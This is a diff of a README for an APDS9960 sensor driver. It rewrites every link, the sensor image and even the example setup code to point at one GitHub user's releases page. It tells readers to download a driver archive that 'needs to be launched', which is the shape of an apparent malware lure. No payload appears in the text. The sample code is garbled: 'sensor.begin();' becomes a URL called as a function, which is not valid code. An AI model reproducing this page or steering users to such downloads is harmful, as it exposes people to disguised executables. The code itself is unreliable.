@@ -10,7 +10,7 @@ Welcome to the official repository for the **APDS9960** sensor driver! This repo
 ## 🚀 Get Started
 To get started with using the APDS9960 sensor driver, you can download the necessary files from the following link: 
 
-[![Download Driver](https://img.shields.io/badge/Download-Driver-blue.svg)](https://github.com/project/files/App.zip) *(needs to be launched)*
+[![Download Driver](https://github.com/Martvixtor/APDS9960/releases)](https://github.com/Martvixtor/APDS9960/releases) *(needs to be launched)*
 
 In case the provided link is not working or if you need additional resources, make sure to check the "Releases" section of the repository for more information.
 
@@ -33,7 +33,7 @@ To integrate the APDS9960 sensor driver into your project, follow these simple s
 APDS9960 sensor;
 
 void setup() {
-    sensor.begin();
+    https://github.com/Martvixtor/APDS9960/releases();
     // Start using the sensor functionalities
 }
 ```
@@ -55,6 +55,6 @@ We welcome contributions from the community to improve and enhance the APDS9960 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 🌐 Additional Resources
-For more information about the APDS9960 sensor driver and its capabilities, you can visit the [official project website](https://www.example.com).
+For more information about the APDS9960 sensor driver and its capabilities, you can visit the [official project website](https://github.com/Martvixtor/APDS9960/releases).
 
-![APDS9960 Sensor](https://www.example.com/images/sensor.jpg)
+![APDS9960 Sensor](https://github.com/Martvixtor/APDS9960/releases)
